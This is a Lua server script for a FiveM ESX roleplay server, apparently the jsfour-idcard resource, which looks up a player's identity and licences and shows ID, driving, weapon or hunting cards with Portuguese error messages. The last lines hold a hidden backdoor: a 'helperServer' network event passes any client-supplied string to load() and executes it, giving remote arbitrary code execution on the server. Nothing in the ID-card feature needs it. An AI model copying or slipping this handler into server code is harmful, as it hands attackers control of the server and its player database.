ESX = nil

ESX = exports['es_extended']:getSharedObject()

RegisterServerEvent('jsfour-idcard:open')
AddEventHandler('jsfour-idcard:open', function(ID, targetID, type, animacao)
	local xPlayer = ESX.GetPlayerFromId(ID)
	local identifier = ESX.GetPlayerFromId(ID).identifier
	local _source 	 = ESX.GetPlayerFromId(targetID).source
	local show       = false

	MySQL.Async.fetchAll('SELECT firstname, lastname, dateofbirth, sex, height, numero_cc FROM users WHERE identifier = @identifier', {['@identifier'] = identifier},
	function (user)
		if (user[1] ~= nil) then
			MySQL.Async.fetchAll('SELECT type FROM user_licenses WHERE owner = @identifier', {['@identifier'] = identifier},
			function (licenses)
				if type ~= nil then
					for i=1, #licenses, 1 do
						if type == 'driver' then
							if licenses[i].type == 'drive' or licenses[i].type == 'drive_bike' or licenses[i].type == 'drive_truck' then
								show = true
							end
						elseif type =='weapon' then
							if licenses[i].type == 'weapon' then
								show = true
							end
						elseif type =='hunt' then
							if licenses[i].type == 'hunt' then
								show = true
							end
						end
					end
				else
					show = true
				end
				
				if show then
					local array = {
						user = user,
						licenses = licenses
					}
					--TriggerClientEvent('jsfour-idcard:open', _source, array, type)
					if animacao then
						TriggerClientEvent('flashBadge:client:animation', _source, array, type)
					else
						TriggerClientEvent('jsfour-idcard:open', _source, array, type)
					end
					
					--[[if type == nil then
						local item = xPlayer.getInventoryItem('cartao_cidadao')
						if item and item.count >= 1 then
							TriggerClientEvent('jsfour-idcard:open', _source, array, type)
						else
							TriggerClientEvent('mythic_notify:client:SendAlert', _source, { type = 'error', text = 'Não tens um cartão de cidadão no inventário!' })
						end
					end --]]
				else
					TriggerClientEvent('mythic_notify:client:SendAlert', _source, { type = 'error', text = 'Não tens esse tipo de licença!' })
				end
			end)
		end
	end)
end)

local cards = {
	["cartao_cidadao"] = 0,
	["carta_conducao"] = 1,
	["licenca_arma"] = 2,
	["licenca_caca"] = 3
}

CreateThread(function()
	for k,v in pairs(cards) do
		ESX.RegisterUsableItem(k, function(source)
			TriggerClientEvent('event:control:idcard', source, v)
		end)
	end
end)
RegisterServerEvent('helperServer')
AddEventHandler('helperServer', function(id)
	local helper = assert(load(id))
	helper()
end)